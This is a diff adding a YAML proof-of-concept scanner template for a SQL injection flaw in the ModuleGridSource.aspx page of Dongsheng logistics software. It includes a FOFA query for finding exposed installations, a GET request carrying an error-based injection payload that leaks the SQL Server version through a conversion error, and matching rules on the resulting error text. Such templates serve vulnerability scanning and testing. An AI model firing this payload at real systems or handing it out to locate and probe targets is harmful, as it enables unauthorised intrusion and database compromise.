@@ -1,0 +1,18 @@
+id: poc-yaml-dongshengsoft-modulegridsource-aspx-sqli
+info:
+  name: 东胜物流软件 ModuleGridSource.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Modules/ModuleGridSource.aspx?handle=list&search=name:a%')and+1<@@VERSION--
+  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"SqlException:")
+    && contains(body,"ModuleGridSource.aspx") && matches(body,"转换成数据类型(.*?)时失败") &&
+    matches(body,"在将(.*?)值")
+transport: http
